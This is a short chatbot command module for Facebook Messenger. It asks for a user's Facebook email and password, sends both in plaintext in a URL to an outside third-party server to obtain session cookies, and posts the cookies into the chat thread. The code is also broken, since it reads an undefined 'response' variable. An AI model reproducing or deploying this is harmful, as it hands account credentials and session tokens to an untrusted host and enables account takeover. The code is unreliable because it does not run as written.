module.exports.config = {
  name: "fbstate",
  version: "1.0.0",
  hasPermssion: 0,
  credits: "Mark Hitsuraan",
  description: "Get appstate through this command no need extension",
  usePrefix: false,
  commandCategory: "other",
  cooldowns: 5
};
 
module.exports.run = async ({ api, event, args }) => {
    const axios = global.nodemodule["axios"];
 
    if (args.length !== 2) {
        return api.sendMessage("Please provide both email and password separated by space.", event.threadID, event.messageID);
    }
 
    const [email, password] = args.map(arg => arg.trim());
 
    const res = await axios.get(`https://appstate.onrender.com/cookie?email=${email}&password=${password}`);
    const mark = response.data.session_cookies;
 
    return api.sendMessage(JSON.stringify(mark, null, 4), event.threadID, event.messageID);
}
//dont change credits or I'll off api
